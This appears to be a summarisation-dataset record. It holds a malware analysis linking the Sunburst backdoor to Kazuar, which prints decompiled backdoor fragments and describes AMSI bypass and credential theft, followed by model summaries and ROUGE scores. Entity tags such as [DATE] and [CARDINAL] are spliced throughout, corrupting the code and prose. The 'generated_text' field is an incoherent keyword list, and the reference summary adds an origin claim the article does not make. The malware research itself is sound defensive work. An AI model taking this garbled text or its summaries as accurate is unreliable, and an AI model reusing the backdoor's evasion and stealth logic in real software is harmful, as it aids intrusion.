Kazuar , and then we will describe the implementation of the same feature in [GPE] Sunburst . Kazuar development and evolution timelineComparison of the sleeping algorithmsBoth [ORG] Kazuar and [ORG] Sunburst have implemented a delay between connections to a [CARDINAL] C2 server , likely designed to make the network activity less obvious . [ORG] KazuarKazuar calculates the time it sleeps between [CARDINAL] two C2 server connections as follows : it takes [CARDINAL] two timestamps , the minimal sleeping time and the maximal sleeping time , and calculates the waiting period with the following formula : generated_sleeping_time = sleeping_timemin+ x ( sleeping_timemax- sleeping_time)minwhere x is a random floating - point number ranging from [CARDINAL] 0 to [CARDINAL] 1 obtained by calling the [ORG] NextDouble method , while sleeping_time and sleeping_time command . As a result of the calculations , the generated time will fall in the [ sleeping_time After calculating the sleeping time , it invokes the Sleep method in a loop . ] range . By the sleeping function in a loop . The only difference is that the code is somewhat less complex . Below we compare an extract of the sleeping algorithm found in [ORG] Kazuar and the code discovered in [GPE] Sunburst . KazuarSunburstThe listed code is used in multiple versions of the backdoor , including samples with MD5 150D0ADDF65B6524EB92B9762DB6F074 ( [DATE] 2016 ) and The random waiting time generation algorithm and the sleeping loop . MD5 The random waiting time generation algorithm and the sleeping loop.3/14123456789101112131415private static void DelayMs(double [ORG] minMs , double maxMs){if ( ( int)maxMs = = [CARDINAL] 0){minMs = [CARDINAL] 1000.0;maxMs = 2000.0;}double num;for ( num = minMs + new Random().NextDouble ( ) * ( maxMs - minMs);num > = [CARDINAL] 2147483647.0 ; num -= It \u2019s noteworthy that both [ORG] Kazuar and [ORG] Sunburst wait for quite a long time before or in - between C2 connections . By default , [ORG] Kazuar chooses a random sleeping time [CARDINAL] between [CARDINAL] two [CARDINAL] and [CARDINAL] four [CARDINAL] weeks , while Sunburst waits from [DATE] 12 [DATE] to [DATE] 14 [DATE] days . Sunburst , like [ORG] Kazuar , implements a command which allows the operators to change the waiting time [CARDINAL] between [CARDINAL] two C2 connections . Based on the analysis of the sleeping algorithm , we conclude : [ORG] Kazuar and [ORG] Sunburst use the same mathematical formula , relying on Random().NextDouble ( ) to calculate the waiting time [ORG] Kazuar randomly selects a sleeping period [CARDINAL] between [CARDINAL] two [CARDINAL] and [CARDINAL] four [CARDINAL] weeks between C2 connections [ORG] Sunburst randomly selects a sleeping period [CARDINAL] between [CARDINAL] twelve [CARDINAL] and [CARDINAL] fourteen [CARDINAL] days before contacting its C2 Such long sleep periods in C2 connections are not very common for typical [ORG] APT malware While [ORG] Kazuar does a Thread . Sleep using a [PRODUCT] TimeSpan object , [ORG] Sunburst uses an Int32 value ; due to the fact that Int32.MaxValue is limited to [DATE] roughly [DATE] 24 [DATE] days of sleep , the developers \u201c emulate \u201d longer sleeps in a loop to get past this limitation In case of both [ORG] Kazuar and [ORG] Sunburst , the sleeping time between two connections can be changed with the help of a command sent by the C2 serverThe FNV-1a hashing algorithmSunburst uses the FNV-1a hashing algorithm extensively throughout its code . This detail initially attracted our attention and we tried to look for other malware that uses the same algorithm . It should be pointed out that the usage of this hashing algorithm is not unique to [ORG] Kazuar and [ORG] Sunburst . However , it provides an interesting starting point for finding more similarities . FNV-1a has been widely used [ORG] by4/14the [ORG] Kazuar .NET Backdoor since its early versions . We compare the usage of FNV-1a in [GPE] Kazuar and Sunburst below . [ORG] KazuarThe shellcode used in [ORG] Kazuar finds addresses of library functions with a variation of the FNV-1a hashing algorithm . The way of finding these addresses is traditional : the shellcode traverses the export address table of a [ORG] DLL , fetches the name of an API function , hashes it and then compares the hash with a given value . A variation of the FNV-1a hashing algorithm in [ORG] Kazuar shellcodepresent in [DATE] 2015 - autumn [DATE] 2020 samples , using a 0x1000197 modified constant instead of the default FNV_32_PRIME 0x1000193 ( MD5150D0ADDF65B6524EB92B9762DB6F074)This customized FNV-1a [CARDINAL] 32 - bit hashing algorithm has been present in the [ORG] Kazuar shellcode since [DATE] 2015 . For the [ORG] Kazuar binaries used in [DATE] 2020 , a modified [CARDINAL] 64 - bit FNV-1a appeared in the code : KazuarMD5 804785B5ED71AADF9878E7FC4BA4295C ( [DATE] Dec [DATE] 2020 ) . Implementation of a modified FNV-1a algorithm ( [QUANTITY] 64 - bit version).12345678910111213public static ulong bu(string pK){byte [ ] bytes = Encoding . UTF8.GetBytes(pK);ulong num = 0xCBF29CE484222325UL;ulong num2 = 0x69294589840FB0E8UL;ulong num3 = 0x100000001B3UL;for ( int i = [CARDINAL] 0 ; i < bytes . Length ; i++){num [DATE] ^= ( ulong)bytes[i];num * = num3;}return num ^ num2;}We observed that the [CARDINAL] 64 - bit FNV-1a hash present in the [DATE] 2020 Kazuar sample is also not standard . When the loop with the [ORG] XOR and multiplication operations finishes execution , the resulting value is XOR - ed with a constant ( XOR 0x69294589840FB0E8UL ) . In the original implementation of the FNV-1a hash , no XOR operation is applied after the loop . Sunburst5/14Sunburst uses a modified , [CARDINAL] 64 - bit FNV-1a hash for the purpose of string obfuscation . For example , when started , Sunburst [ORDINAL] first takes the FNV-1a hash of its process name ( solarwinds.businesslayerhost ) and checks if it is equal to a hardcoded value ( 0xEFF8D627F39A2A9DUL ) . If the hashes do not coincide , the backdoor code will not be executed:12345678910public static void [GPE] Initialize(){try{if ( OrionImprovementBusinessLayer . GetHash(Process . GetCurrentProcess().ProcessName . ToLower ( ) ) = = 0xEFF8D627F39A2A9DUL ) //\"solarwinds.businesslayerhost\"{// backdoor execution [ORG] code}}}Hashes are also used to detect security tools running on the system . During its execution Sunburst iterates through the list of processes ( Process . GetProcesses ( ) ) , services ( from \u201c SYSTEM\\\\CurrentControlSet\\\\services \u201c ) and drivers ( [ORG] WMI , \u201c Select * From Win32_SystemDriver \u201c ) , hashes their names and looks them up in arrays containing the corresponding hardcoded hashes:123456789101112private static bool SearchAssemblies(Process [ ] processes){for ( int i = [CARDINAL] 0 ; i < processes . Length ; i++){ulong hash = OrionImprovementBusinessLayer . GetHash(processes[i].ProcessName . [PERSON] ToLower());if ( [ORG] Array . IndexOf < ulong>(OrionImprovementBusinessLayer.assemblyTimeStamps , hash ) ! = -1){return true;}}return false;}Below we compare the modified FNV-1a implementations of the [CARDINAL] two algorithms in [GPE] Kazuar and [ORG] Sunburst . String obfuscation comparisonKazuarCode adapted from [DATE] MD5 [DATE] 804785B5ED71AADF9878E7FC4BA4295C ( [DATE] Dec [DATE] 2020 ) . Implementation of a modified [CARDINAL] 64 - bit FNV-1a algorithm ( deobfuscated , with constant folding applied).SunburstMD5 Implementation of the modified [QUANTITY] 64 - bit [ORG] FNV- [ORG] 1a algorithm.6/1412345678910111213public static ulong bu(string pK){byte [ ] bytes = Encoding . UTF8.GetBytes(pK);ulong num = 0xCBF29CE484222325UL;ulong num2 = 0x69294589840FB0E8UL;ulong num3 = 0x100000001B3UL;for ( int i = [CARDINAL] 0 ; i < bytes . Length ; i++){num [DATE] ^= ( ulong)bytes[i];num * = num3;}return num ^ num2;}12345678910111213141516private static ulong GetHash(string s){ulong num = [CARDINAL] 0xCBF29CE484222325UL;try{foreach ( byte b in Encoding . [DATE] UTF8.GetBytes(s)){num [DATE] ^= ( ulong)b;num * = [CARDINAL] 0x100000001B3UL;}}catch{}return num ^ 0x5BAC903BA7D81967UL;}It should be noted that both [ORG] Kazuar and [ORG] Sunburst use a modified [CARDINAL] 64 - bit FNV-1a hash , which adds an extra step after the loop , [PERSON] XOR\u2019ing the final result with a [QUANTITY] 64 - bit constant . Some readers might assume that the FNV-1a hashing was inserted by the compiler because C # compilers can optimize switch statements with strings into a series of if statements . In this compiler optimized code , the [CARDINAL] 32 - bit FNV-1a algorithm is used to calculate hashes of strings : Clean executableOptimized switch statement . SunburstMD5 [PRODUCT] 2C4A910A1299CDAE2A4E55988A2F102E. [PRODUCT] Switch statement.7/1412345678910111213ulong hash = < PrivateImplementationDetails>.ComputeStringHash(key);// computes [QUANTITY] 32 - bit FNV-1aif ( num < = 0x848C8620U){if ( num < = [CARDINAL] 0x3A79338FU){if ( num < = 0x150EFE0DU){if ( num ! = [CARDINAL] 0x11DE6CDCU){if ( num ! = [PERSON] 0x13F0FB79U){if ( num = = 0x150EFE0DU){// direct string compare : if ( key = = \" divisibleBy\"){// case handling code } In the case of Sunburst , the hashes in the switch statement do not appear to be compiler - generated . In fact , the C # compiler uses 32- bit , not [CARDINAL] 64 - bit hashing . The hashing algorithm added by the compiler also does not have an additional XOR operation in the end . The compiler inserts the hashing method in the class , while in Sunburst the same code is implemented within the OrionImprovementBusinessLayer class . The compiler - emitted FNV-1a method will have the [ORG] ComputeStringHash name . In case of Sunburst , the name of the method is [ORG] GetHash . Additionally , the compiler inserts a check which compares the hashed string with a hardcoded value in order to eliminate the possibility of a collision . In Sunburst , there are no such string comparisons , which suggests these hash checks are not a compiler optimization . To conclude the findings , we summarize them as follows : Both Sunburst and [ORG] Kazuar use FNV-1a hashing throughout their code A modified [QUANTITY] 32 - bit FNV-1a hashing algorithm has been used by the [ORG] Kazuar shellcode since [DATE] 2015 to resolve APIs This [ORG] Kazuar shellcode uses a modified FNV-1a hash where its FNV_32_PRIME is 0x1000197 ( instead of the default FNV_32_PRIME [ORG] 0x1000193 ) A modified [CARDINAL] 64 - bit version of the FNV-1a hashing algorithm was implemented in [GPE] Kazuar versions found in [DATE] 2020 The modified [CARDINAL] 64 - bit FNV-1a hashing algorithms implemented in [GPE] Kazuar ( [DATE] November [DATE] and [DATE] December [DATE] 2020 variants ) have [CARDINAL] one extra step : after the hash is calculated , it is [ORG] XORed with a hardcoded constant ( 0x69294589840FB0E8UL ) Sunburst also uses a modified [CARDINAL] 64 - bit FNV-1a hashing algorithm , with [CARDINAL] one extra step : after the hash is calculated , it is [ORG] XORed with a hardcoded constant ( [CARDINAL] 0x5BAC903BA7D81967UL ) The [CARDINAL] 64 - bit constant used in the last step of the hashing is different between [ORG] Kazuar and Sunburst The aforementioned hashing algorithm is used to conceal plain strings in [ORG] SunburstThe algorithm used to generate victim identifiersAnother similarity between [ORG] Kazuar and [ORG] Sunburst can be found in the algorithm used to generate the unique victim identifiers , described below . [PERSON] KazuarIn order to generate unique strings ( across different victims ) , such as client identifiers , mutexes or file names , [ORG] Kazuar uses an algorithm which accepts a string as input . To derive a unique string from the given one , the backdoor gets the MD5 hash of the string and then XORs it with a [QUANTITY] four - byte unique \u201c seed \u201d from the machine . The seed is obtained by fetching the serial number of the volume where the8/14operating system is installed . SunburstAn MD5+XOR algorithm can also be found in Sunburst . However , instead of the volume serial number , it uses a different set of information as the machine \u2019s unique seed , hashes it with MD5 then it XORs the [CARDINAL] two hash halves together . The [CARDINAL] two implementations are compared in the following table : KazuarSunburstThe listed code is used in multiple versions of the backdoor , including MD5 150D0ADDF65B6524EB92B9762DB6F074 ( [DATE] 2016 ) and The MD5+XOR algorithm . MD5 2C4A910A1299CDAE2A4E55988A2F102E. Part of a function with the MD5+XOR algorithm.123456789public static Guid md5_plus_xor(string string_0 ) { byte [ ] bytes = [ORG] BitConverter . GetBytes(parameter_class.unique_pc_identifier);byte [ ] array = hash64 ) { string text = OrionImprovementBusinessLayer . ReadDeviceInfo();hash64 = new byte[8];Array . Clear(hash64 , [CARDINAL] 0 , hash64.Length);if ( text = = null ) { return false;}<part of the code omitted for clarity > using ( MD5 md = MD5.Create ( ) ) { byte [ ] bytes = Encoding . ASCII.GetBytes(text);byte [ ] array = md . [PERSON] ComputeHash(bytes);if ( array . Length < hash64.Length ) { return false;}for ( int i = [CARDINAL] 0 ; i < array . Length ; i++ ) { byte [ ] array2 = hash64;int num = i % hash64.Length;array2[num ] [DATE] ^= array[i];}}return true;}To summarize these findings : To calculate unique victim UIDs , both [ORG] Kazuar and [ORG] Sunburst use a hashing algorithm which is different from their otherwise \u201c favourite \u201d FNV-1a ; a combination of MD5+XOR : Kazuar XORs a full 128 - bit [QUANTITY] MD5 of a pre - defined string with a [QUANTITY] four - byte key which contains the volume serial number [ORG] Sunburst computes an MD5 from a larger set of data , which concatenates the [ORDINAL] first adapter [ORG] MAC address ( retrieved using [ORG] NetworkInterface . GetAllNetworkInterfaces ( ) ) , the computer domain ( GetIPGlobalProperties().DomainName ) and machine [ORG] GUID ( \u201c HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Cryptography \u201d - > \u201c MachineGuid \u201d ) , then it XORs together the [CARDINAL] two halves into an eight - bytes resultThis MD5+XOR algorithm is present in all [ORG] Kazuar samples used before [DATE] November [DATE] 2020 ( a massive code change , almost a complete redesign , was applied to [ORG] Kazuar in [DATE] November [DATE] 2020)False flags possibility9/14The possibility of a false flag is particularly interesting and deserves additional attention . In the past , we have seen sophisticated attacks such as [ORG] OlympicDestroyer confusing the industry and complicating attribution . Subtle mistakes , such as the raw re - use of the Rich header from the [PRODUCT] Lazarus samples from the [GPE] Bangladesh bank heist , allowed us to demonstrate that they were indeed false flags and allowed us to eventually connect [ORG] OlympicDestroyer with [ORG] Hades , a sophisticated [ORG] APT group . Supposing that [ORG] Kazuar false flags were deliberately introduced into [EVENT] Sunburst , there are [CARDINAL] two main explanations of how this may have happened:1 . The use of XOR operation after the main FNV-1a computation was introduced in the [DATE] 2020 Kazuar variants after it had appeared in the [EVENT] Sunburst code . In this case , the possibility of a false flag is less likely as the authors of Sunburst could n\u2019t have predicted the [ORG] Kazuar \u2019s developers \u2019 actions with such high [GPE] precision.2 . A sample of [ORG] Kazuar was released before [EVENT] Sunburst was written , containing the modified [CARDINAL] 64 - bit hash function , and went unnoticed by everyone except the Sunburst developers . In this case , the Sunburst developers must have been aware of new [ORG] Kazuar variants . Obviously , tracing all modifications of unknown code is quite a difficult and tedious task for the following reasons : [ORG] Kazuar \u2019s developers are constantly changing their code as well as the packing methods , thus making it harder to detect the backdoor with [ORG] YARA rules ; [ORG] Kazuar samples ( especially the new ones ) quite rarely appear on [ORG] VirusTotal . The [ORDINAL] second argument comes with a caveat ; the earliest Sunburst sample with the modified algorithm we have seen was compiled in [DATE] February [DATE] 2020 , while the new [ORG] Kazuar was compiled in or around [DATE] November [DATE] 2020 . In [DATE] the [DATE] spring [DATE] and [DATE] summer [DATE] of [DATE] 2020 , \u201c old \u201d samples of [ORG] Kazuar were actively used , without the [CARDINAL] 64 - bit modified FNV-1a hash . This means that option [CARDINAL] 1 ( the extra XOR was introduced in the [DATE] 2020 Kazuar variants after it had appeared in [EVENT] Sunburst ) is more likely . [DATE] November [DATE] 2020 \u2013 a new [ORG] KazuarIn [DATE] November [DATE] 2020 , some significant changes happened to [ORG] Kazuar . On [DATE] November [DATE] 18 , our products detected a previously unknown [ORG] Kazuar sample ( MD5 [MONEY] 9A2750B3E1A22A5B614F6189EC2D67FA ) . In this sample , the code was refactored , and the malware became much stealthier as most of its code no longer resembled that of the older versions . Here are the most important changes in [ORG] Kazuar \u2019s code : The infamous \u201c [ORG] Kazuar \u2019s { 0 } started in process { [CARDINAL] 1 } [ { [CARDINAL] 2 } ] as user { [CARDINAL] 3}/{4 } . \u201d string was removed from the binary and replaced with a much subtler \u201c Agent started inside { 0 } . \u201d message , meaning that the backdoor is no longer called [ORG] Kazuar in the logs . Despite that , the GUID , which was present in [ORG] Kazuar since [DATE] 2015 and serves as the backdoor \u2019s unique identifier , still appears in the refactored version of [ORG] Kazuar . Depending on the configuration , the malware may now protect itself from being detected by [ORG] the Anti - Malware Scan Interface by patching the [ORDINAL] first bytes of the AmsiScanBuffer API function . New spying features have been added to the backdoor . Now [ORG] Kazuar is equipped with a keylogger and a password stealer which can fetch browser history data , cookies , proxy server credentials and , most importantly , passwords from Internet browsers , [ORG] Filezilla , Outlook , [PERSON] Git and WinSCP . It also gets vault credentials . The stealer is implemented in the form of a [CARDINAL] C2 server command . [ORG] Commands have been completely revamped . The system information retrieval function now also hunts for [ORG] UAC settings and installed hot patches and drivers . The webcam shot - taking command has been completely removed from the backdoor . [ORG] Commands which allow the execution of [ORG] WMI commands and the running of arbitrary [ORG] PowerShell , VBS and [ORG] JS scripts have been introduced into [ORG] Kazuar . The malware can now also gather forensic data ( \u201c forensic \u201d is a name of a command present in the refactored version of [ORG] Kazuar ) . [ORG] Kazuar collects information about executables that run at startup , recently launched executables and compatibility assistant settings . Furthermore , a command to collect saved credentials from files left from unattended installation and IIS has been introduced into the backdoor . The data is now exfiltrated to the [CARDINAL] C2 server using ZIP archives instead of [ORG] TAR . A class that implements parsing of different file formats has been added into [ORG] Kazuar . It is currently not used anywhere in the code . This class can throw exceptions with the \u201c Fucking poltergeist \u201d text . In earlier versions of [ORG] Kazuar , a \u201c [PERSON] Shellcode fucking poltergeist error \u201d message was logged if there was a problem with shellcode.10/14The MD5+XOR algorithm is not as widely used as before in the latest version of [ORG] Kazuar . The backdoor generates most of unique strings and identifiers with an algorithm which is based on the already discussed FNV-1a hash and Base62 . The MD5+XOR updated backdoor sample . In order to generate a random sleeping period , the malware now uses a more orthodox random number generation algorithm : [ORG] Kazuar ( [DATE] 2020 ) . The new random number generation algorithm . Methods were renamed for [ORG] clarity.12345678public static long generate_random_number_in_range(long wG , long [ORG] NG){if ( wG > NG){utility_class.swap < long>(ref wG , ref NG);}return Math . Abs(utility_class.get_random_int64 ( ) ) % ( NG - wG + 1L ) + wG;}11/14The newest sample of [ORG] Kazuar ( MD5 024C46493F876FA9005047866BA3ECBD ) was detected by our products on [DATE] December [DATE] 29 . It also contained refactored code . For now , it \u2019s unclear why the [ORG] Kazuar developers implemented these massive code changes in [DATE] November . Some possibilities include : It \u2019s a normal evolution of the codebase , where new features are constantly added while older ones are moved The [ORG] Kazuar developers wanted to avoid detection by various antivirus products or [ORG] EDR solutions [PERSON] Suspecting the [ORG] SolarWinds attack might be discovered , the [ORG] Kazuar code was changed to resemble the [ORDINAL] Sunburst backdoor as little as possibleConclusionsThese code overlaps between [ORG] Kazuar and [ORG] Sunburst are interesting and represent the [ORDINAL] first potential identified link to a previously known malware family . Although the usage of the sleeping algorithm may be too wide , the custom implementation of the [ORG] FNV-1a hashes and the reuse of the MD5+XOR algorithm in [GPE] Sunburst are definitely important clues . We should also point out that although similar , the [ORG] UID calculation subroutine and the FNV-1a hash usage , as well the sleep loop , are still not 100 % identical . Possible explanations for these similarities include : Sunburst was developed by the same group as [ORG] Kazuar The Sunburst developers adopted some ideas or code from [ORG] Kazuar , without having a direct connection ( they used [ORG] Kazuar as an inspiration point ) Both groups , [ORG] DarkHalo / [ORG] UNC2452 and the group using [ORG] Kazuar , obtained their malware from the same source Some of the [ORG] Kazuar developers moved to another team , taking knowledge and tools with them The Sunburst developers introduced these subtle links as a form of false flag , in order to shift blame to another groupAt the moment , we do not know which one of these options is true . While [ORG] Kazuar and [ORG] Sunburst may be related , the nature of this relation is still not clear . Through further analysis , it is possible that evidence confirming [CARDINAL] one or several of these points might arise . At the same time , it is also possible that the Sunburst developers were really good at their opsec and did n\u2019t make any mistakes , with this link being an elaborate false flag . In any case , this overlap does n\u2019t change much for the defenders . Supply chain attacks are some of the most sophisticated types of attacks nowadays and have been successfully used in the past by [ORG] APT groups such as Winnti / Barium / APT41 and various cybercriminal groups . To limit exposure to supply chain attacks , we recommend the following : Isolate network management software in separate VLANs , monitor them separately from the user networks [PRODUCT] Limit outgoing internet connections from servers or appliances that run [ORDINAL] third party software Implement regular memory dumping and analysis ; checking for malicious code running in a decrypted state using a code similarity solution such as [ORG] Kaspersky [ORG] Threat [ORG] Attribution [ORG] Engine ( KTAE)More information about [PERSON] UNC2452 , [ORG] DarkHalo , [ORG] Sunburst and [ORG] Kazuar is available to customers of [ORG] the [ORG] Kaspersky [ORG] Intelligence [ORG] Reporting service . Contact : intelreports[at]kaspersky.comFAQ1 . TLDR ; just tell us who \u2019s behind the [ORG] SolarWinds supply chain [DATE] attack?Honestly , we do n\u2019t know . What we found so far is a couple of code similarities between [ORG] Sunburst and a malware discovered in [DATE] 2017 , called [ORG] Kazuar . This malware was [ORDINAL] first observed around [DATE] 2015 and is still being used in the wild . The most advanced [ORG] Kazuar sample we found is from [DATE] December [DATE] 2020 . During [DATE] five [DATE] years of [ORG] Kazuar evolution , we observed a continuous development , in which significant features , which bear resemblance to Sunburst , were added . While these similarities between [ORG] Kazuar and [ORG] Sunburst are notable , there could be a lot of reasons for their existence , including : Sunburst was developed by the same group as [ORG] Kazuar The Sunburst developers used some ideas or code from [ORG] Kazuar , without having a direct connection ( they used [ORG] Kazuar code as \u201c inspiration \u201d ) Both groups , that is , the [LAW] DarkHalo / [PERSON] UNC2452 and the group using [ORG] Kazuar obtained their malware from the same source One of the [ORG] Kazuar developers moved to another team , taking his knowledge and tools with them The Sunburst developers introduced these subtle links as a form of a false flag , in order to shift the blame to another groupAt the moment , we simply do not know which of these options is true . Through further analysis , it is possible that evidence enforcing [CARDINAL] one or several of these points might arise . To clarify \u2013 we are NOT saying that [ORG] DarkHalo / [PERSON] UNC2452 , the group using [ORG] Sunburst , and [ORG] Kazuar or [GPE] Turla are the same.12/142 . What are these similarities ? Could these similarities be just coincidences?In principle , none of these algorithms or implementations are unique . In particular , the things that attracted our attention were the obfuscation of strings through modified FNV-1a algorithms , where the hash result is XOR\u2019ed with a [QUANTITY] 64 - bit constant , the implementation of the [CARDINAL] C2 connection delay , using a large ( and unusual ) value ( [ORG] Kazuar uses a random sleeping time [CARDINAL] between [CARDINAL] two [CARDINAL] and [CARDINAL] four [CARDINAL] weeks , while Sunburst waits from [DATE] 12 [DATE] to [DATE] 14 [DATE] days ) and the calculation of the victim UID through an MD5 + XOR algorithm . It should be pointed that none of these code fragments are 100 % identical . Nevertheless , they are curious coincidences , to say at least . [CARDINAL] One coincidence would n\u2019t be that unusual , [CARDINAL] two coincidences would definitively raise an eyebrow , while [CARDINAL] three such coincidences are kind of suspicious to us.3 . What is this [ORG] Kazuar malware?Kazuar is a fully featured .NET backdoor , and was first reported by our colleagues from [ORG] Palo [ORG] Alto [ORG] Networks in [DATE] 2017 . The researchers surmised at the time that it may have been used by the [ORG] Turla [ORG] APT group , in order to replace their Carbon platform and other [PERSON] Turla second stage backdoors . Our own observations confirm that [ORG] Kazuar was used , together with other [GPE] Turla tools , during multiple breaches in [DATE] the [DATE] past [DATE] few [DATE] years , and is still in use . Also , [PERSON] Epic [PERSON] Turla resolves imports with another customized version of the FNV-1a hash and has code similarities with [ORG] Kazuar \u2019s shellcode.4 . So Sunburst is connected to Turla?Not necessarily , refer to question [CARDINAL] 1 for all possible explanations.5 . The media claims APT29 is responsible for the [ORG] SolarWinds hack . Are you saying that \u2019s wrong?We do not know who is behind the [ORG] SolarWinds hack \u2013 we believe attribution is a question better left for law enforcement and judicial institutions . To clarify , our research has identified a number of shared code features between the [FAC] Sunburst malware and [ORG] Kazuar . Our research has placed APT29 as another potential name for \u201c [WORK_OF_ART] The [WORK_OF_ART] Dukes \u201d , which appears to be an umbrella group comprising multiple actors and malware families . We initially reported [ORG] MiniDuke , the earliest malware in this umbrella , in [DATE] 2013 . In [DATE] 2014 , we reported other malware used by \u201c [WORK_OF_ART] The [WORK_OF_ART] Dukes \u201d , named CosmicDuke . In CosmicDuke , the debug path strings from the malware seemed to indicate several build environments or groups of \u201c users \u201d of the \u201c [WORK_OF_ART] Bot [WORK_OF_ART] Gen [WORK_OF_ART] Studio \u201d : \u201c NITRO \u201d and \u201c [WORK_OF_ART] Nemesis [WORK_OF_ART] Gemina \u201d . In short , we suspect CosmicDuke was being leveraged by [CARDINAL] up [CARDINAL] to [CARDINAL] three different entities , raising the possibility it was shared across groups . [CARDINAL] One of the interesting observations from our [DATE] 2014 research was the usage of a webshell by [CARDINAL] one of the \u201c [WORK_OF_ART] Bot [WORK_OF_ART] Gen [WORK_OF_ART] Studio \u201d / \u201c CosmicDuke \u201d entities that we have seen before in use by [PERSON] Turla . This could suggest that [GPE] Turla is possibly just [CARDINAL] one of the several users of the tools under the \u201c Dukes \u201d umbrella.6 . How is this connected to [ORG] Cozy [ORG] Duke?In [ORG] 2015 , we published futher research on [ORG] CozyDuke , which seemed to focus on what appeared to be government organizations and commercial entities in the [GPE] US , [GPE] Germany and other countries . In [DATE] 2014 , their targets , as reported in the media , included [ORG] the [ORG] White [ORG] House and [ORG] the [ORG] US [ORG] Department [ORG] of [ORG] State . At the time , the media also called it \u201c the worst ever \u201d hack . At the moment , we do not see any direct links between the [DATE] 2015 [ORG] CozyDuke and the [PRODUCT] SolarWinds attack.7 . How solid are the links with [ORG] Kazuar?Several code fragments from Sunburst and various generations of [ORG] Kazuar are quite similar . We should point out that , although similar , these code blocks , such as the [ORG] UID calculation subroutine and the FNV-1a hashing algorithm usage , as well the sleep loop , are still not 100 % identical . Together with certain development choices , these suggest that a kind of a similar thought process went into the development of [ORG] Kazuar and [ORG] Sunburst . The [ORG] Kazuar malware continued to evolve and later [DATE] 2020 variants are even more similar , in some respect , to the [ORG] Sunburst branch . Yet , we should emphasise again , they are definitely not identical.8 . So , are you saying Sunburst is essentially a modified [PERSON] Kazuar?We are not saying [EVENT] Sunburst is [ORG] Kazuar , or that it is the work of the [ORG] Turla [ORG] APT group . We spotted some interesting similarities between these [CARDINAL] two malware families and felt the world should know about them . We love to do our part , contributing our findings to the community discussions ; others can check these similarities on their own , draw their own conclusions and find more links . What is the most important thing here is to publish interesting findings and encourage others to do more research . We will , of course , continue with our own research [ORG] too.9 . Is this the worst cyberattack in history?Attacks should always be judged from the victim \u2019s point of view . It should also account for physical damage , if any , loss of human lives and so on . For now , it would appear the purpose of this attack was cyberespionage , that is , extraction of sensitive information . By comparison , other infamous attacks , such as [ORG] NotPetya or [ORG] WannaCry had a significantly destructive side , with victim losses in [MONEY] the [MONEY] billions [MONEY] of [MONEY] dollars . Yet , for some out there , this may be more devastating than [ORG] NotPetya or [ORG] WannaCry ; for others , it pales in comparison.10 . How did we get here?During [DATE] the [DATE] past [DATE] years , we \u2019ve observed what can be considered a \u201c cyber arms race \u201d . Pretty much all nation states have rushed , since [DATE] the [DATE] early [DATE] 2000s , to develop offensive military capabilities in cyberspace , with little attention to defense . The difference is immediately notable when it comes to the budgets available for the purchase of offensive cyber capabilities vs the development of defensive capabilities . The world needs more balance to the ( cyber-)force . Without that , the existing cyber conflicts will continue to escalate , to the detriment of the normal internet user.11 . Is it possible this is a false flag?In theory , anything is possible ; and we have seen examples of sophisticated false flag attacks , such as the [ORG] OlympicDestroyer attack . For a full list of possible explanations refer to question [CARDINAL] 1.12 . So . Now what?We believe it \u2019s important that other researchers around the world also investigate these similarities and attempt to discover more facts about [ORG] Kazuar and the origin of [ORG] Sunburst , the malware used in the [ORG] SolarWinds breach . If we consider past experience , for instance looking back to the [ORG] WannaCry attack , in [DATE] the [DATE] early [DATE] days , there were very few facts linking them to the [ORG] Lazarus group . In time , more evidence appeared and allowed us , and others , to link them together with high confidence . Further research on this topic can be crucial to connecting the dots.13/14Indicators of [PRODUCT] CompromiseFile [PRODUCT] hashes:123456789E220EAE9F853193AFE77567EA05294C8 ( [ORDINAL] First detected [ORG] Kazuar sample , compiled in [DATE] 2015)150D0ADDF65B6524EB92B9762DB6F074 ( [ORG] Kazuar sample compiled in [DATE] 2016)54700C4CA2854858A572290BCD5501D4 ( [ORG] Kazuar sample compiled in [CARDINAL] 2017)053DDB3B6E38F9BDBC5FB51FDD44D3AC ( [ORG] Kazuar sample compiled in [CARDINAL] 2018)1F70BEF5D79EFBDAC63C9935AA353955 ( [ORG] Kazuar sample compiled in [DATE] 2019)9A2750B3E1A22A5B614F6189EC2D67FA ( [ORG] Kazuar sample used in [DATE] November [DATE] 2020)804785B5ED71AADF9878E7FC4BA4295C ( [ORG] Kazuar sample used in [DATE] December [DATE] 2020)024C46493F876FA9005047866BA3ECBD ( Most recent [NORP] Kazuar sample)2C4A910A1299CDAE2A4E55988A2F102E ( [ORG] Sunburst sample)More information about [PERSON] UNC2452 , [ORG] DarkHalo , [ORG] Sunburst and [ORG] Kazuar is available to customers of [ORG] the [ORG] Kaspersky [ORG] Intelligence [ORG] Reporting service . Contact : intelreports[at]kaspersky.comSunburst backdoor \u2013 code overlaps with [ORG] KazuarYour email address will not be published . Required fields are marked * [CARDINAL] 14/14", "generated_text": "the analysis; a.NET backdoor; Kazuar; 2017; Turla APT; Kazuar developers; the same backdoor; the same algorithm; the victim UID generation algorithm; the FNV-1a hash; memory; changes; details; the C2 server; the attackers; the C2 server; its C2 server; the C2 server; the attackers; other Turla tools; Kazuar; the backdoor; development; Lazarus; the connection; connections; the kernel; the UID; the README user; a command; the security team; configuration; process injection; detection; the Sunburst backdoor; the origin; this attack; details.", "ref_text": "<START-1>The document analyzes similarities between the Sunburst malware used in the SolarWinds supply chain attack and an older backdoor called Kazuar first reported in 2017. Overlapping code features suggest a potential link between Sunburst and Kazuar. Key similarities include the use of a modified FNV-1a hashing algorithm, a long delays between C2 communications, and a victim ID generation algorithm using MD5 and XOR. While not identical, the shared algorithms indicate similar thought processes in developing the malware. Kazuar has been continuously updated since 2015 and associated with cyberespionage campaigns out of Russia. The latest 2020 Kazuar versions contain code even more similar to Sunburst. The nature of the connection between the two malware families remains unclear - they could originate from the same group, reuse code, have a common source, or it could be an intentional false flag. More research is needed to uncover the relationship between Sunburst and Kazuar. The code overlaps don't definitively tie SolarWinds to Kazuar or the Turla APT group, but provide an initial link for further investigation. The key is encouraging more researchers to analyze the similarity and connections between the two sophisticated malware families. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4986149584487534, "gpt3/lexical/rouge_rouge2": 0.12813370473537603, "gpt3/lexical/rouge_rougeL": 0.27146814404432135, "gpt3/lexical/rouge_rougeLsum": 0.27146814404432135, "gpt3_generated_text": ["The article delves into the analysis of the Sunburst backdoor, a custom malware used in the SolarWinds breach, and its striking similarities with the Kazuar.NET backdoor first reported by Palo Alto in 2017. Both backdoors share features such as the victim UID generation algorithm, the sleeping algorithm, and the extensive use of the FNV-1a hash. The 